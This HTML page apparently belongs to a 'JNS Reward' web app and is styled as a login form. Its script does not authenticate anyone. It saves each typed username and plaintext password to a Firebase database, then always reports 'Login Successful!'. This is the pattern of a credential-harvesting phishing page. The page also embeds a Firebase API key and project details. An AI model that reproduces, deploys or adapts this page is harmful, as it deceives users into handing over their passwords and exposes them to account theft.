<html><head><base href="/" />
    <title>JNS Reward WebApp - Login</title>
    <link rel="stylesheet" href="https://raw.githubusercontent.com/dumakulem300/JNSReward/refs/heads/main/styles.css">
    
</head>
<body>
    <div class="box">
        <div class="form">
            <div class="logo">
                <svg viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="45" fill="none" stroke="#4e54c8" stroke-width="2"/>
                    <text x="50" y="60" text-anchor="middle" fill="#4e54c8" font-size="24" font-weight="bold">JNS</text>
                </svg>
            </div>
            <h2>JNS Reward Login</h2>
            <form>
                <div class="inputbox">
                    <input type="text" id="username" required>
                    <span>Username</span>
                </div>
                <div class="inputbox">
                    <input type="password" id="password" required>
                    <span>Password</span>           
                </div>
                <button type="submit" class="sub" id="submit">Login</button>
                <div class="register-link">
                    Need an account? <a href="https://example.com/register">Register</a>
                </div>
            </form>
        </div>
    </div>

    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCW00cTz7YJykOAfCpVMUMNrgbR3UkjDN8",
            authDomain: "fir-9-casa.firebaseapp.com",
            databaseURL: "https://fir-9-casa-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "fir-9-casa",
            storageBucket: "fir-9-casa.firebasestorage.app",
            messagingSenderId: "1010224484193",
            appId: "1:1010224484193:web:89c8947567ed93d235ff20"
        };
          
        // Initialize Firebase
        const app = initializeApp(firebaseConfig);

        //get ref to database services
        const db = getDatabase(app);

        document.getElementById("submit").addEventListener('click', function(e){
            e.preventDefault();
            set(ref(db, 'user/' + document.getElementById("username").value),
            {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value
            });
            alert("Login Successful!");
        })
    </script>
</body></html>
